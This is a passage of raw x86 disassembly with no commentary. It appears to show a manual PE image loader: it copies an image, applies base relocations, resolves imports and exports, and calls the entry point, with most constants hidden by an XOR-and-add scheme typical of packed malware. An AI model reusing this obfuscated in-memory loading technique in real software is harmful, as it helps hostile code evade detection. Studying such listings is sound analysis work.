  41e737:	mov    BYTE PTR [ecx+0x8],0xf
  41e73b:	mov    BYTE PTR [eax+0x1],0x5
  41e73f:	mov    BYTE PTR [ecx+0x5],0xb
  41e743:	leave  
  41e744:	ret    0x4
  41e747:	push   esi
  41e748:	mov    ecx,edi
  41e74a:	call   0x41e718
  41e74f:	mov    edx,edi
  41e751:	mov    ecx,esi
  41e753:	mov    BYTE PTR [esi],0x1f
  41e756:	call   0x41e6eb
  41e75b:	push   esi
  41e75c:	mov    ecx,edi
  41e75e:	mov    BYTE PTR [esi+0x5],0xb
  41e762:	call   0x41e6bc
  41e767:	push   esi
  41e768:	mov    BYTE PTR [esi+0x6],0xf
  41e76c:	call   0x41e689
  41e771:	mov    BYTE PTR [esi+0x2],0x0
  41e775:	mov    edx,esi
  41e777:	jmp    0x41e659
  41e77c:	push   ebp
  41e77d:	mov    ebp,esp
  41e77f:	push   ecx
  41e780:	mov    ecx,DWORD PTR [edx+0x194]
  41e786:	push   esi
  41e787:	mov    esi,DWORD PTR [ebp+0x8]
  41e78a:	mov    esi,DWORD PTR [esi]
  41e78c:	mov    DWORD PTR [ecx],esi
  41e78e:	mov    ecx,DWORD PTR [edx+0x194]
  41e794:	mov    ecx,DWORD PTR [ecx]
  41e796:	mov    esi,DWORD PTR [edx+0x190]
  41e79c:	mov    DWORD PTR [esi],ecx
  41e79e:	mov    eax,DWORD PTR [edx+0x194]
  41e7a4:	mov    ecx,DWORD PTR [eax]
  41e7a6:	mov    ecx,DWORD PTR [ecx+0x3c]
  41e7a9:	add    ecx,DWORD PTR [eax]
  41e7ab:	mov    DWORD PTR [ebp-0x4],0xf89ca581
  41e7b2:	mov    eax,DWORD PTR [ebp-0x4]
  41e7b5:	movzx  ecx,WORD PTR [ecx+0x16]
  41e7b9:	xor    eax,0x751089d
  41e7be:	add    eax,0x3272e4
  41e7c3:	pop    esi
  41e7c4:	test   ecx,eax
  41e7c6:	je     0x41e7d4
  41e7c8:	mov    eax,DWORD PTR [edx+0x1c8]
  41e7ce:	mov    DWORD PTR [eax],0xf89c8580
  41e7d4:	leave  
  41e7d5:	ret    0x4
  41e7d8:	push   ebp
  41e7d9:	mov    ebp,esp
  41e7db:	sub    esp,0x70
  41e7de:	and    DWORD PTR [ebp-0x20],0x0
  41e7e2:	mov    DWORD PTR [ebp-0x18],0xf89cb581
  41e7e9:	mov    DWORD PTR [ebp-0x1c],0xf89c85c1
  41e7f0:	mov    DWORD PTR [ebp-0x2c],0xf89c85bd
  41e7f7:	mov    DWORD PTR [ebp-0x14],0xf89c8583
  41e7fe:	mov    DWORD PTR [ebp-0x2c],0xf89f0581
  41e805:	mov    eax,DWORD PTR [ebp+0x20]
  41e808:	mov    eax,DWORD PTR [eax+0x194]
  41e80e:	mov    DWORD PTR [ebp-0xc],eax
  41e811:	mov    eax,DWORD PTR [ebp+0x20]
  41e814:	push   ebx
  41e815:	push   esi
  41e816:	mov    esi,DWORD PTR [eax+0x190]
  41e81c:	mov    eax,DWORD PTR [ebp+0x20]
  41e81f:	mov    eax,DWORD PTR [eax+0x18c]
  41e825:	mov    DWORD PTR [ebp-0x8],eax
  41e828:	mov    eax,DWORD PTR [eax]
  41e82a:	push   edi
  41e82b:	mov    DWORD PTR [ebp-0x4],esi
  41e82e:	test   eax,eax
  41e830:	jne    0x41e83d
  41e832:	push   DWORD PTR [ebp+0x1c]
  41e835:	mov    edx,DWORD PTR [ebp+0x20]
  41e838:	call   0x41e77c
  41e83d:	mov    eax,DWORD PTR [esi]
  41e83f:	mov    ebx,DWORD PTR [esi]
  41e841:	add    ebx,DWORD PTR [eax+0x3c]
  41e844:	mov    eax,DWORD PTR [ebp+0xc]
  41e847:	mov    ecx,DWORD PTR [ebp-0x8]
  41e84a:	mov    ecx,DWORD PTR [ecx]
  41e84c:	mov    esi,0x751089d
  41e851:	xor    eax,esi
  41e853:	mov    edi,0x3272e4
  41e858:	add    eax,edi
  41e85a:	cmp    eax,ecx
  41e85c:	jne    0x41ea94
  41e862:	mov    eax,DWORD PTR [ebp-0xc]
  41e865:	mov    eax,DWORD PTR [eax]
  41e867:	mov    DWORD PTR [ebp-0x10],eax
  41e86a:	mov    eax,DWORD PTR [ebx+0x50]
  41e86d:	mov    DWORD PTR [ebp-0x68],eax
  41e870:	mov    eax,DWORD PTR [ebp-0x18]
  41e873:	xor    eax,esi
  41e875:	add    eax,edi
  41e877:	mov    DWORD PTR [ebp-0x64],eax
  41e87a:	mov    eax,DWORD PTR [ebp-0x14]
  41e87d:	and    DWORD PTR [ebp-0x6c],0x0
  41e881:	xor    eax,esi
  41e883:	add    eax,edi
  41e885:	mov    DWORD PTR [ebp-0x60],eax
  41e888:	lea    eax,[ebp-0x70]
  41e88b:	push   eax
  41e88c:	mov    eax,DWORD PTR [ebp+0x8]
  41e88f:	xor    eax,esi
  41e891:	add    eax,edi
  41e893:	push   eax
  41e894:	mov    eax,DWORD PTR [ebp+0x20]
  41e897:	add    eax,0xaa
  41e89c:	push   eax
  41e89d:	mov    eax,DWORD PTR [ebp+0x20]
  41e8a0:	mov    eax,DWORD PTR [eax+0x198]
  41e8a6:	mov    DWORD PTR [ebp-0x70],0x4
  41e8ad:	push   DWORD PTR [eax]
  41e8af:	mov    eax,DWORD PTR [ebp+0x10]
  41e8b2:	call   eax
  41e8b4:	mov    ecx,DWORD PTR [ebp-0xc]
  41e8b7:	mov    ecx,DWORD PTR [ecx]
  41e8b9:	mov    edx,DWORD PTR [ebp-0x8]
  41e8bc:	mov    DWORD PTR [ebp-0x6c],eax
  41e8bf:	mov    DWORD PTR [ebp+0x1c],eax
  41e8c2:	mov    DWORD PTR [edx],ecx
  41e8c4:	mov    ecx,DWORD PTR [ebp-0x4]
  41e8c7:	mov    DWORD PTR [ecx],eax
  41e8c9:	mov    eax,DWORD PTR [ebx+0x50]
  41e8cc:	mov    DWORD PTR [ebp-0x68],eax
  41e8cf:	mov    eax,DWORD PTR [ebp-0x1c]
  41e8d2:	xor    eax,esi
  41e8d4:	add    eax,edi
  41e8d6:	mov    DWORD PTR [ebp-0x64],eax
  41e8d9:	lea    eax,[ebp-0x20]
  41e8dc:	mov    DWORD PTR [ebp-0x60],eax
  41e8df:	lea    eax,[ebp-0x70]
  41e8e2:	push   eax
  41e8e3:	mov    eax,DWORD PTR [ebp+0x8]
  41e8e6:	xor    eax,esi
  41e8e8:	add    eax,edi
  41e8ea:	push   eax
  41e8eb:	mov    eax,DWORD PTR [ebp+0x20]
  41e8ee:	add    eax,0xee
  41e8f3:	push   eax
  41e8f4:	mov    eax,DWORD PTR [ebp+0x20]
  41e8f7:	mov    eax,DWORD PTR [eax+0x198]
  41e8fd:	mov    DWORD PTR [ebp-0x70],0x4
  41e904:	push   DWORD PTR [eax]
  41e906:	mov    eax,DWORD PTR [ebp+0x10]
  41e909:	call   eax
  41e90b:	test   eax,eax
  41e90d:	je     0x41e932
  41e90f:	and    DWORD PTR [ebp+0xc],0x0
  41e913:	cmp    DWORD PTR [ebx+0x50],0x0
  41e917:	jbe    0x41e932
  41e919:	mov    eax,DWORD PTR [ebp+0x1c]
  41e91c:	mov    ecx,DWORD PTR [ebp-0x10]
  41e91f:	sub    ecx,eax
  41e921:	mov    dl,BYTE PTR [ecx+eax*1]
  41e924:	inc    DWORD PTR [ebp+0xc]
  41e927:	mov    BYTE PTR [eax],dl
  41e929:	mov    edx,DWORD PTR [ebp+0xc]
  41e92c:	inc    eax
  41e92d:	cmp    edx,DWORD PTR [ebx+0x50]
  41e930:	jb     0x41e921
  41e932:	mov    edx,DWORD PTR [ebp+0x1c]
  41e935:	mov    ecx,DWORD PTR [edx+0x3c]
  41e938:	add    ecx,edx
  41e93a:	mov    eax,DWORD PTR [ecx+0xa0]
  41e940:	mov    ebx,DWORD PTR [ecx+0x28]
  41e943:	add    eax,edx
  41e945:	sub    edx,DWORD PTR [ebp-0x10]
  41e948:	add    ebx,DWORD PTR [ebp+0x1c]
  41e94b:	mov    DWORD PTR [ebp+0xc],edx
  41e94e:	mov    DWORD PTR [ebp-0x2c],ecx
  41e951:	mov    DWORD PTR [ebp-0x14],ebx
  41e954:	mov    DWORD PTR [ebp-0x8],0x0
  41e95b:	jmp    0x41e9d7
  41e95d:	add    edx,0xfffffff8
  41e960:	shr    edx,1
  41e962:	mov    DWORD PTR [ebp-0x18],edx
  41e965:	je     0x41e9c3
  41e967:	lea    edx,[eax+0x8]
  41e96a:	mov    DWORD PTR [ebp-0x4],edx
  41e96d:	mov    edx,DWORD PTR [ebp-0x18]
  41e970:	mov    DWORD PTR [ebp-0x18],edx
  41e973:	mov    edx,DWORD PTR [ebp-0x4]
  41e976:	movzx  edx,WORD PTR [edx]
  41e979:	mov    DWORD PTR [ebp-0x24],edx
  41e97c:	and    edx,0xfff
  41e982:	mov    DWORD PTR [ebp-0x28],edx
  41e985:	mov    edx,DWORD PTR [ebp-0x24]
  41e988:	shr    edx,0xc
  41e98b:	add    edx,0xffcd8d1c
  41e991:	xor    edx,esi
  41e993:	cmp    edx,0xf89c8582
  41e999:	jne    0x41e9ba
  41e99b:	mov    edx,DWORD PTR [ebp-0x28]
  41e99e:	add    edx,DWORD PTR [ebp+0x1c]
  41e9a1:	mov    ebx,DWORD PTR [eax]
  41e9a3:	cmp    DWORD PTR [ebx+edx*1],0x0
  41e9a7:	je     0x41e9b7
  41e9a9:	mov    ecx,DWORD PTR [ebp+0xc]
  41e9ac:	add    ecx,DWORD PTR [ebx+edx*1]
  41e9af:	mov    ebx,DWORD PTR [eax]
  41e9b1:	mov    DWORD PTR [edx+ebx*1],ecx
  41e9b4:	mov    ecx,DWORD PTR [ebp-0x2c]
  41e9b7:	mov    ebx,DWORD PTR [ebp-0x14]
  41e9ba:	add    DWORD PTR [ebp-0x4],0x2
  41e9be:	dec    DWORD PTR [ebp-0x18]
  41e9c1:	jne    0x41e973
  41e9c3:	mov    edx,DWORD PTR [ebp-0xc]
  41e9c6:	add    DWORD PTR [ebp-0x8],edx
  41e9c9:	mov    edx,DWORD PTR [ebp-0x8]
  41e9cc:	cmp    edx,DWORD PTR [ecx+0xa4]
  41e9d2:	jae    0x41e9e5
  41e9d4:	add    eax,DWORD PTR [ebp-0xc]
  41e9d7:	mov    edx,DWORD PTR [eax+0x4]
  41e9da:	mov    DWORD PTR [ebp-0xc],edx
  41e9dd:	test   edx,edx
  41e9df:	jne    0x41e95d
  41e9e5:	mov    eax,DWORD PTR [ebp-0x10]
  41e9e8:	mov    DWORD PTR [ebp-0x6c],eax
  41e9eb:	mov    DWORD PTR [ebp-0x70],0x4
  41e9f2:	mov    eax,DWORD PTR [ecx+0x50]
  41e9f5:	mov    DWORD PTR [ebp-0x68],eax
  41e9f8:	mov    eax,DWORD PTR [ebp-0x1c]
  41e9fb:	xor    eax,esi
  41e9fd:	add    eax,edi
  41e9ff:	mov    DWORD PTR [ebp-0x64],eax
  41ea02:	lea    eax,[ebp-0x20]
  41ea05:	mov    DWORD PTR [ebp-0x60],eax
  41ea08:	lea    eax,[ebp-0x70]
  41ea0b:	push   eax
  41ea0c:	mov    eax,DWORD PTR [ebp+0x8]
  41ea0f:	xor    eax,esi
  41ea11:	add    eax,edi
  41ea13:	push   eax
  41ea14:	mov    eax,DWORD PTR [ebp+0x20]
  41ea17:	add    eax,0xee
  41ea1c:	push   eax
  41ea1d:	mov    eax,DWORD PTR [ebp+0x20]
  41ea20:	mov    eax,DWORD PTR [eax+0x198]
  41ea26:	push   DWORD PTR [eax]
  41ea28:	mov    eax,DWORD PTR [ebp+0x10]
  41ea2b:	call   eax
  41ea2d:	mov    eax,DWORD PTR [ebp+0x20]
  41ea30:	mov    eax,DWORD PTR [eax+0x180]
  41ea36:	add    eax,DWORD PTR [ebp+0xc]
  41ea39:	mov    ecx,DWORD PTR [ebp+0xc]
  41ea3c:	push   DWORD PTR [ebp+0x18]
  41ea3f:	mov    DWORD PTR [eax],ecx
  41ea41:	push   DWORD PTR [ebp+0x14]
  41ea44:	push   DWORD PTR [ebp+0x1c]
  41ea47:	call   ebx
  41ea49:	mov    ecx,DWORD PTR [ebp+0xc]
  41ea4c:	add    ecx,DWORD PTR [ebp+0x20]
  41ea4f:	lea    eax,[ebp+0x4]
  41ea52:	mov    DWORD PTR [ebp+0x20],ecx
  41ea55:	mov    ecx,DWORD PTR [ebp+0x20]
  41ea58:	mov    ecx,DWORD PTR [ebp+0x20]
  41ea5b:	mov    edx,DWORD PTR [ecx+0x190]
  41ea61:	mov    ecx,DWORD PTR [ebp+0x20]
  41ea64:	mov    ecx,DWORD PTR [ecx+0x18c]
  41ea6a:	mov    esi,DWORD PTR [ecx]
  41ea6c:	cmp    DWORD PTR [eax],esi
  41ea6e:	jb     0x41ea8f
  41ea70:	mov    esi,DWORD PTR [edx]
  41ea72:	mov    edi,DWORD PTR [edx]
  41ea74:	mov    esi,DWORD PTR [esi+0x3c]
  41ea77:	lea    esi,[edi+esi*1+0x50]
  41ea7b:	mov    edi,DWORD PTR [ecx]
  41ea7d:	add    edi,DWORD PTR [esi]
  41ea7f:	cmp    DWORD PTR [eax],edi
  41ea81:	jae    0x41ea8f
  41ea83:	mov    esi,DWORD PTR [ecx]
  41ea85:	mov    ecx,DWORD PTR [eax]
  41ea87:	mov    edx,DWORD PTR [edx]
  41ea89:	sub    ecx,esi
  41ea8b:	add    edx,ecx
  41ea8d:	mov    DWORD PTR [eax],edx
  41ea8f:	mov    eax,DWORD PTR [ebp+0xc]
  41ea92:	jmp    0x41ea96
  41ea94:	xor    eax,eax
  41ea96:	pop    edi
  41ea97:	pop    esi
  41ea98:	pop    ebx
  41ea99:	leave  
  41ea9a:	ret    0x1c
  41ea9d:	push   ebp
  41ea9e:	mov    ebp,esp
  41eaa0:	sub    esp,0x1c
  41eaa3:	push   esi
  41eaa4:	mov    esi,eax
  41eaa6:	mov    eax,DWORD PTR [ecx+0x190]
  41eaac:	cmp    DWORD PTR [eax],0x0
  41eaaf:	je     0x41ebbf
  41eab5:	test   edx,edx
  41eab7:	je     0x41ebbf
  41eabd:	test   esi,esi
  41eabf:	je     0x41ebbf
  41eac5:	mov    eax,DWORD PTR [esi+0x88]
  41eacb:	test   eax,eax
  41eacd:	je     0x41ebba
  41ead3:	cmp    DWORD PTR [esi+0x8c],0x10
  41eada:	je     0x41ebba
  41eae0:	cmp    DWORD PTR [esi+0x34],edx
  41eae3:	je     0x41ebba
  41eae9:	mov    esi,DWORD PTR [ecx+0x18c]
  41eaef:	and    DWORD PTR [ebp-0x10],0x0
  41eaf3:	mov    ecx,edx
  41eaf5:	sub    ecx,DWORD PTR [esi]
  41eaf7:	add    eax,edx
  41eaf9:	movzx  edx,WORD PTR [eax+0xc]
  41eafd:	mov    DWORD PTR [ebp-0x1c],ecx
  41eb00:	movzx  ecx,WORD PTR [eax+0xe]
  41eb04:	add    ecx,edx
  41eb06:	je     0x41ebba
  41eb0c:	lea    ecx,[eax+0x14]
  41eb0f:	push   ebx
  41eb10:	mov    DWORD PTR [ebp-0x18],ecx
  41eb13:	mov    esi,0x7fffffff
  41eb18:	push   edi
  41eb19:	test   DWORD PTR [ecx],esi
  41eb1b:	je     0x41eb9c
  41eb1d:	mov    edx,DWORD PTR [ecx]
  41eb1f:	and    DWORD PTR [ebp-0xc],0x0
  41eb23:	and    edx,esi
  41eb25:	add    edx,eax
  41eb27:	movzx  edi,WORD PTR [edx+0xe]
  41eb2b:	movzx  ebx,WORD PTR [edx+0xc]
  41eb2f:	add    edi,ebx
  41eb31:	je     0x41eb9c
  41eb33:	lea    ecx,[edx+0x14]
  41eb36:	mov    DWORD PTR [ebp-0x14],ecx
  41eb39:	test   DWORD PTR [ecx],esi
  41eb3b:	je     0x41eb7e
  41eb3d:	mov    ecx,DWORD PTR [ecx]
  41eb3f:	and    DWORD PTR [ebp-0x8],0x0
  41eb43:	and    ecx,esi
  41eb45:	add    ecx,eax
  41eb47:	movzx  edi,WORD PTR [ecx+0xe]
  41eb4b:	movzx  ebx,WORD PTR [ecx+0xc]
  41eb4f:	add    edi,ebx
  41eb51:	je     0x41eb7e
  41eb53:	lea    edi,[ecx+0x14]
  41eb56:	mov    DWORD PTR [ebp-0x4],edi
  41eb59:	mov    edi,DWORD PTR [ebp-0x4]
  41eb5c:	mov    edi,DWORD PTR [edi]
  41eb5e:	test   edi,edi
  41eb60:	je     0x41eb68
  41eb62:	mov    ebx,DWORD PTR [ebp-0x1c]
  41eb65:	add    DWORD PTR [edi+eax*1],ebx
  41eb68:	movzx  edi,WORD PTR [ecx+0xe]
  41eb6c:	movzx  ebx,WORD PTR [ecx+0xc]
  41eb70:	inc    DWORD PTR [ebp-0x8]
  41eb73:	add    DWORD PTR [ebp-0x4],0x8
  41eb77:	add    edi,ebx
  41eb79:	cmp    DWORD PTR [ebp-0x8],edi
  41eb7c:	jb     0x41eb59
  41eb7e:	movzx  edi,WORD PTR [edx+0xe]
  41eb82:	movzx  ebx,WORD PTR [edx+0xc]
  41eb86:	mov    ecx,DWORD PTR [ebp-0x14]
  41eb89:	inc    DWORD PTR [ebp-0xc]
  41eb8c:	add    ecx,0x8
  41eb8f:	add    edi,ebx
  41eb91:	mov    DWORD PTR [ebp-0x14],ecx
  41eb94:	cmp    DWORD PTR [ebp-0xc],edi
  41eb97:	jb     0x41eb39
  41eb99:	mov    ecx,DWORD PTR [ebp-0x18]
  41eb9c:	movzx  edx,WORD PTR [eax+0xe]
  41eba0:	movzx  edi,WORD PTR [eax+0xc]
  41eba4:	inc    DWORD PTR [ebp-0x10]
  41eba7:	add    ecx,0x8
  41ebaa:	add    edx,edi
  41ebac:	mov    DWORD PTR [ebp-0x18],ecx
  41ebaf:	cmp    DWORD PTR [ebp-0x10],edx
  41ebb2:	jb     0x41eb19
  41ebb8:	pop    edi
  41ebb9:	pop    ebx
  41ebba:	xor    eax,eax
  41ebbc:	inc    eax
  41ebbd:	jmp    0x41ebc1
  41ebbf:	xor    eax,eax
  41ebc1:	pop    esi
  41ebc2:	leave  
  41ebc3:	ret    
  41ebc4:	push   ebp
  41ebc5:	mov    ebp,esp
  41ebc7:	mov    ecx,DWORD PTR [ecx+0x190]
  41ebcd:	mov    eax,DWORD PTR [ebp+0xc]
  41ebd0:	sub    esp,0x10
  41ebd3:	push   ebx
  41ebd4:	xor    ebx,ebx
  41ebd6:	push   esi
  41ebd7:	push   edi
  41ebd8:	cmp    DWORD PTR [ecx],ebx
  41ebda:	je     0x41ec62
  41ebe0:	cmp    eax,ebx
  41ebe2:	je     0x41ec62
  41ebe4:	cmp    DWORD PTR [eax+0x78],ebx
  41ebe7:	jne    0x41ebee
  41ebe9:	xor    eax,eax
  41ebeb:	inc    eax
  41ebec:	jmp    0x41ec64
  41ebee:	mov    eax,DWORD PTR [eax+0x78]
  41ebf1:	add    eax,DWORD PTR [ebp+0x8]
  41ebf4:	mov    ecx,DWORD PTR [eax+0x1c]
  41ebf7:	mov    edx,DWORD PTR [eax+0x24]
  41ebfa:	mov    esi,DWORD PTR [eax+0x14]
  41ebfd:	mov    edi,DWORD PTR [eax+0x18]
  41ec00:	add    ecx,DWORD PTR [ebp+0x8]
  41ec03:	add    edx,DWORD PTR [ebp+0x8]
  41ec06:	mov    DWORD PTR [ebp-0x4],esi
  41ec09:	cmp    esi,edi
  41ec0b:	ja     0x41ec10
  41ec0d:	mov    DWORD PTR [ebp-0x4],edi
  41ec10:	mov    DWORD PTR [ebp-0x8],ebx
  41ec13:	cmp    DWORD PTR [ebp-0x4],ebx
  41ec16:	jbe    0x41ebe9
  41ec18:	cmp    ebx,DWORD PTR [eax+0x14]
  41ec1b:	jae    0x41ec23
  41ec1d:	movzx  esi,WORD PTR [edx+ebx*2]
  41ec21:	jmp    0x41ec25
  41ec23:	mov    esi,ebx
  41ec25:	lea    esi,[ecx+esi*4]
  41ec28:	mov    edi,DWORD PTR [esi]
  41ec2a:	test   edi,edi
  41ec2c:	je     0x41ec57
  41ec2e:	add    edi,DWORD PTR [ebp+0x8]
  41ec31:	mov    DWORD PTR [ebp-0x10],edi
  41ec34:	cmp    edi,eax
  41ec36:	jbe    0x41ec48
  41ec38:	mov    ebx,DWORD PTR [ebp+0xc]
  41ec3b:	mov    ebx,DWORD PTR [ebx+0x7c]
  41ec3e:	add    ebx,eax
  41ec40:	cmp    edi,ebx
  41ec42:	jae    0x41ec48
  41ec44:	mov    esi,DWORD PTR [esi]
  41ec46:	jmp    0x41ec50
  41ec48:	sub    edi,DWORD PTR [ebp+0x8]
  41ec4b:	mov    DWORD PTR [esi],edi
  41ec4d:	mov    esi,DWORD PTR [ebp-0x10]
  41ec50:	test   esi,esi
  41ec52:	je     0x41ec62
  41ec54:	mov    ebx,DWORD PTR [ebp-0x8]
  41ec57:	inc    ebx
  41ec58:	mov    DWORD PTR [ebp-0x8],ebx
  41ec5b:	cmp    ebx,DWORD PTR [ebp-0x4]
  41ec5e:	jb     0x41ec18
  41ec60:	jmp    0x41ebe9
  41ec62:	xor    eax,eax
  41ec64:	pop    edi
  41ec65:	pop    esi
  41ec66:	pop    ebx
  41ec67:	leave  
  41ec68:	ret    0x8
  41ec6b:	push   ebp
  41ec6c:	mov    ebp,esp
  41ec6e:	sub    esp,0x2c
  41ec71:	mov    edx,0xf89c8581
  41ec76:	mov    DWORD PTR [ebp-0x4],edx
  41ec79:	mov    DWORD PTR [ebp-0x8],0xf89c8580
  41ec80:	mov    eax,DWORD PTR [ebp-0x4]
  41ec83:	mov    ecx,DWORD PTR [ebp-0x4]
  41ec86:	mov    ecx,DWORD PTR [ebp-0x4]
  41ec89:	mov    ecx,DWORD PTR [ebp-0x4]
  41ec8c:	mov    ecx,DWORD PTR [ebp-0x4]
  41ec8f:	mov    ecx,DWORD PTR [ebp-0x4]
  41ec92:	push   ebx
  41ec93:	mov    ebx,DWORD PTR [ebp+0x10]
  41ec96:	push   esi
  41ec97:	mov    esi,0x751089d
  41ec9c:	mov    DWORD PTR [ebp-0x10],0x352eb0f
  41eca3:	mov    ecx,DWORD PTR [ebp-0x4]
  41eca6:	mov    ebx,DWORD PTR [ebx+0x190]
  41ecac:	push   edi
  41ecad:	mov    edi,0x3272e4
  41ecb2:	xor    ecx,esi
  41ecb4:	xor    eax,esi
  41ecb6:	add    eax,edi
  41ecb8:	add    ecx,edi
  41ecba:	mov    DWORD PTR [ebp-0x18],eax
  41ecbd:	cmp    ecx,DWORD PTR [ebx]
  41ecbf:	je     0x41ef40
  41ecc5:	mov    ebx,DWORD PTR [ebp-0x4]
  41ecc8:	mov    ecx,DWORD PTR [ebp+0xc]
  41eccb:	xor    ebx,esi
  41eccd:	add    ebx,edi
  41eccf:	cmp    ebx,ecx
  41ecd1:	je     0x41ef40
  41ecd7:	mov    ebx,DWORD PTR [ebp-0x4]
  41ecda:	mov    ecx,DWORD PTR [ecx+0x80]
  41ece0:	xor    ebx,esi
  41ece2:	add    ebx,edi
  41ece4:	cmp    ecx,ebx
  41ece6:	je     0x41ef3b
  41ecec:	add    ecx,DWORD PTR [ebp+0x8]
  41ecef:	mov    DWORD PTR [ebp-0x2c],ecx
  41ecf2:	mov    ebx,edx
  41ecf4:	xor    ebx,esi
  41ecf6:	add    ebx,edi
  41ecf8:	mov    DWORD PTR [ebp-0x10],ebx
  41ecfb:	mov    ebx,DWORD PTR [ebp-0x10]
  41ecfe:	cmp    ebx,edx
  41ed00:	je     0x41ed14
  41ed02:	mov    edx,DWORD PTR [ebp-0x10]
  41ed05:	mov    ebx,DWORD PTR [ebp-0x4]
  41ed08:	imul   edx,edx,0x14
  41ed0b:	xor    ebx,esi
  41ed0d:	add    ebx,edi
  41ed0f:	cmp    DWORD PTR [edx+ecx*1],ebx
  41ed12:	jne    0x41ed2b
  41ed14:	mov    edx,DWORD PTR [ebp-0x10]
  41ed17:	mov    ebx,DWORD PTR [ebp-0x4]
  41ed1a:	imul   edx,edx,0x14
  41ed1d:	xor    ebx,esi
  41ed1f:	add    ebx,edi
  41ed21:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  41ed25:	je     0x41ef2d
  41ed2b:	mov    eax,DWORD PTR [ebp-0x4]
  41ed2e:	mov    ebx,DWORD PTR [ebp-0x4]
  41ed31:	mov    eax,DWORD PTR [ebp-0x10]
  41ed34:	imul   eax,eax,0x14
  41ed37:	add    eax,ecx
  41ed39:	mov    ecx,DWORD PTR [eax+0x10]
  41ed3c:	add    ecx,DWORD PTR [ebp+0x8]
  41ed3f:	xor    ebx,esi
  41ed41:	mov    DWORD PTR [ebp-0x1c],ecx
  41ed44:	mov    ecx,DWORD PTR [ebp-0x4]
  41ed47:	mov    edx,DWORD PTR [ebp-0x4]
  41ed4a:	xor    ecx,esi
  41ed4c:	add    ecx,edi
  41ed4e:	xor    edx,esi
  41ed50:	mov    DWORD PTR [ebp-0x24],ecx
  41ed53:	mov    ecx,DWORD PTR [eax]
  41ed55:	add    edx,edi
  41ed57:	add    ebx,edi
  41ed59:	cmp    ecx,edx
  41ed5b:	je     0x41ed63
  41ed5d:	add    ecx,DWORD PTR [ebp+0x8]
  41ed60:	mov    DWORD PTR [ebp-0x24],ecx
  41ed63:	mov    ecx,DWORD PTR [ebp-0x4]
  41ed66:	xor    ecx,esi
  41ed68:	add    ecx,DWORD PTR [eax+0xc]
  41ed6b:	mov    eax,DWORD PTR [ebp+0x8]
  41ed6e:	lea    eax,[ecx+eax*1+0x3272e4]
  41ed75:	mov    DWORD PTR [ebp+0xc],eax
  41ed78:	mov    DWORD PTR [ebp-0x28],0xf89c85bc
  41ed7f:	mov    eax,DWORD PTR [ebp+0x10]
  41ed82:	push   DWORD PTR [ebp+0xc]
  41ed85:	mov    eax,DWORD PTR [eax+0x1d8]
  41ed8b:	call   DWORD PTR [eax]
  41ed8d:	mov    ecx,DWORD PTR [ebp-0x4]
  41ed90:	xor    ecx,esi
  41ed92:	add    ecx,edi
  41ed94:	mov    DWORD PTR [ebp-0xc],eax
  41ed97:	cmp    ecx,eax
  41ed99:	jne    0x41edad
  41ed9b:	mov    eax,DWORD PTR [ebp+0x10]
  41ed9e:	push   DWORD PTR [ebp+0xc]
  41eda1:	mov    eax,DWORD PTR [eax+0x1d8]
  41eda7:	call   DWORD PTR [eax+0xc]
  41edaa:	mov    DWORD PTR [ebp-0xc],eax
  41edad:	mov    DWORD PTR [ebp-0x20],0x7f661b08
  41edb4:	mov    DWORD PTR [ebp-0x20],0xf89c9998
  41edbb:	mov    eax,DWORD PTR [ebp-0x4]
  41edbe:	xor    eax,esi
  41edc0:	add    eax,edi
  41edc2:	cmp    eax,DWORD PTR [ebp-0xc]
  41edc5:	jne    0x41edea
  41edc7:	mov    eax,DWORD PTR [ebp-0x8]
  41edca:	mov    ecx,DWORD PTR [ebp-0x20]
  41edcd:	xor    eax,esi
  41edcf:	xor    ecx,esi
  41edd1:	lea    ebx,[ebx+eax*1+0x3272e4]
  41edd8:	mov    eax,DWORD PTR [ebp+0x10]
  41eddb:	mov    eax,DWORD PTR [eax+0x1d8]
  41ede1:	add    ecx,edi
  41ede3:	imul   ecx,ebx
  41ede6:	push   ecx
  41ede7:	call   DWORD PTR [eax+0x24]
  41edea:	mov    eax,DWORD PTR [ebp-0x4]
  41eded:	xor    eax,esi
  41edef:	add    eax,edi
  41edf1:	cmp    eax,DWORD PTR [ebp-0xc]
  41edf4:	jne    0x41ee05
  41edf6:	mov    eax,DWORD PTR [ebp-0x28]
  41edf9:	xor    eax,esi
  41edfb:	add    eax,edi
  41edfd:	cmp    ebx,eax
  41edff:	jbe    0x41ed7f
  41ee05:	mov    eax,DWORD PTR [ebp-0x4]
  41ee08:	xor    eax,esi
  41ee0a:	add    eax,edi
  41ee0c:	cmp    eax,DWORD PTR [ebp-0xc]
  41ee0f:	jne    0x41ee28
  41ee11:	mov    eax,DWORD PTR [ebp-0x8]
  41ee14:	mov    ecx,DWORD PTR [ebp-0x18]
  41ee17:	xor    eax,esi
  41ee19:	lea    eax,[ecx+eax*1+0x3272e4]
  41ee20:	mov    DWORD PTR [ebp-0x18],eax
  41ee23:	jmp    0x41ef17
  41ee28:	mov    DWORD PTR [ebp-0x14],0x1121b09
  41ee2f:	mov    DWORD PTR [ebp+0xc],0xe042d0f
  41ee36:	mov    ebx,DWORD PTR [ebp-0x4]
  41ee39:	xor    ebx,esi
  41ee3b:	add    ebx,edi
  41ee3d:	jmp    0x41ef04
  41ee42:	mov    eax,DWORD PTR [ebp-0x4]
  41ee45:	xor    eax,esi
  41ee47:	add    eax,edi
  41ee49:	mov    DWORD PTR [ebp-0x14],eax
  41ee4c:	mov    eax,DWORD PTR [ebp-0x4]
  41ee4f:	xor    eax,esi
  41ee51:	add    eax,edi
  41ee53:	mov    DWORD PTR [ebp+0xc],eax
  41ee56:	mov    ecx,DWORD PTR [ebp-0x4]
  41ee59:	mov    eax,DWORD PTR [ebp-0x24]
  41ee5c:	xor    ecx,esi
  41ee5e:	add    ecx,edi
  41ee60:	cmp    ecx,eax
  41ee62:	je     0x41ee6a
  41ee64:	mov    eax,DWORD PTR [eax+ebx*4]
  41ee67:	mov    DWORD PTR [ebp-0x14],eax
  41ee6a:	mov    eax,DWORD PTR [ebp-0x1c]
  41ee6d:	mov    eax,DWORD PTR [eax+ebx*4]
  41ee70:	mov    DWORD PTR [ebp+0xc],eax
  41ee73:	mov    eax,DWORD PTR [ebp-0x4]
  41ee76:	mov    ecx,DWORD PTR [ebp-0x14]
  41ee79:	xor    eax,esi
  41ee7b:	add    eax,edi
  41ee7d:	cmp    eax,ecx
  41ee7f:	je     0x41eeaa
  41ee81:	mov    eax,DWORD PTR [ebp-0x4]
  41ee84:	mov    ecx,DWORD PTR [ebp-0x14]
  41ee87:	xor    eax,esi
  41ee89:	add    eax,edi
